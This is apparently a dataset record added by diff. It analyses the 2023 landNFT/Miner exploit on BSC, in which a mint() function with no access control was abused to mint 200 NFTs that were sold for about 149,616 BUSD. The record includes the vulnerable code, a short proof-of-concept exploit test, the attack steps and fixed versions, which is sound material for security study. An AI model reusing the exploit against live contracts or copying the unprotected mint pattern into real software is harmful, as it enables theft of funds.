@@ -1,0 +1,34 @@
+{
+ "id": "2023__2023-05-16_landNFT_UnrestrictedMint",
+ "source_file": "2023/2023-05-16_landNFT_UnrestrictedMint.md",
+ "title": "landNFT — Unlimited NFT Mint Authorization Vulnerability Analysis",
+ "date": "2023-05-16",
+ "protocol": "landNFT / Miner",
+ "chain": "BSC",
+ "loss_raw": "200 landNFT → 28,601 XQJ → 149,616 BUSD",
+ "loss_usd": null,
+ "root_cause": "No authorization check in the `mint()` function of the Miner contract",
+ "attack_tx": "0xe4db1550...",
+ "vulnerable_contract": "0x2e599883...",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "// ❌ mint function with no authorization check\ninterface IMiner {\n    // ❌ Callable by anyone — no onlyOwner, onlyMinter, etc.\n    function mint(address[] memory to, uint256[] memory value) external;\n}\n\n// Estimated implementation\ncontract Miner {\n    IERC721 public landNFT;\n\n    // ❌ No access control\n    function mint(address[] memory to, uint256[] memory value) external {\n        for (uint256 i = 0; i < to.length; i++) {\n            // ❌ Mints arbitrary quantities without caller verification\n            for (uint256 j = 0; j < value[i]; j++) {\n                landNFT.mint(to[i]);\n            }\n        }\n    }\n}",
+  "// File: landNFT_decompiled.sol\n    function mint(address[] param0, uint256[] param1) external {}  // ❌",
+  "function testExploit() public {\n    // Check NFT balance before attack\n    emit log_named_uint(\"NFT balance before attack\", landNFT.balanceOf(address(this)));\n\n    // 1. Mint 200 NFTs without authorization\n    address[] memory to = new address[](1);\n    to[0] = address(this);\n    uint256[] memory amount = new uint256[](1);\n    amount[0] = 200;\n    // ❌ No authorization check → succeeds\n    minerContract.mint(to, amount);\n\n    // Check NFT balance after attack\n    emit log_named_uint(\"NFT balance after attack\", landNFT.balanceOf(address(this)));\n    // → 200 NFTs obtained\n\n    // 2. Swap NFTs for XQJ tokens (calls separate contract)\n    // 3. Sell XQJ → BUSD for 149,616 BUSD profit\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: add access control\ncontract Miner is Ownable {\n    mapping(address => bool) public isMinter;\n\n    modifier onlyMinter() {\n        require(isMinter[msg.sender], \"Not authorized minter\");\n        _;\n    }\n\n    // ✅ Only authorized addresses can call\n    function mint(address[] memory to, uint256[] memory value) external onlyMinter {\n        for (uint256 i = 0; i < to.length; i++) {\n            for (uint256 j = 0; j < value[i]; j++) {\n                landNFT.mint(to[i]);\n            }\n        }\n    }\n}",
+  "// ✅ Use OpenZeppelin AccessControl\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\n\ncontract Miner is AccessControl {\n    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n\n    function mint(address[] memory to, uint256[] memory value)\n        external\n        onlyRole(MINTER_ROLE)  // ✅ Authorization check\n    {\n        // ... mint logic\n    }\n}"
+ ],
+ "steps": [
+  "1. minerContract.mint([attacker], [200])",
+  "→ No authorization check → 200 landNFT",
+  "2. 200 landNFT → XQJ token swap",
+  "3. XQJ → BUSD sell"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────┐\n│  1. minerContract.mint([attacker], [200])    │\n│     → No authorization check → 200 landNFT  │\n│       obtained for free                      │\n└─────────────────────┬───────────────────────┘\n                      ▼\n┌─────────────────────────────────────────────┐\n│  2. 200 landNFT → XQJ token swap            │\n│     (28,601 XQJ received)                    │\n└─────────────────────┬───────────────────────┘\n                      ▼\n┌─────────────────────────────────────────────┐\n│  3. XQJ → BUSD sell                         │\n│     (149,616 BUSD received)                  │\n└─────────────────────────────────────────────┘"
+ ]
+}
